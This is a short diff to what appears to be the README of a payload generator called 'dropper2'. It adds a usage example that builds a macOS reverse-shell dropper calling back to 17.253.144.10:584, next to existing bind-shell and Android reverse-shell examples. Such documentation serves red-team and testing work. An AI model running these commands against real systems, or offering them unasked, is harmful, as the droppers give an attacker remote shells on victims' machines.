@@ -35,6 +35,8 @@ Usage of ./dropper2:
 
 <code>./dropper2 -a mips64 -o cheeseburgers -p linux -l 0.0.0.0:31337 -s /bin/busybox -t bind</code>
 
+<code>./dropper2 -a amd64 -o applebutter -p darwin -l 17.253.144.10:584 -s /bin/sh -t reverse</code>
+
 <code>./dropper2 -a arm -o trapspot -p android -l 25.128.34.6:443 -s /system/bin/sh -t reverse </code>*<h5>(*NOTE: Only works on <a href="https://termux.com/">Termux</a> for Android)</h5>
 
 <h3>FAQ</h3>
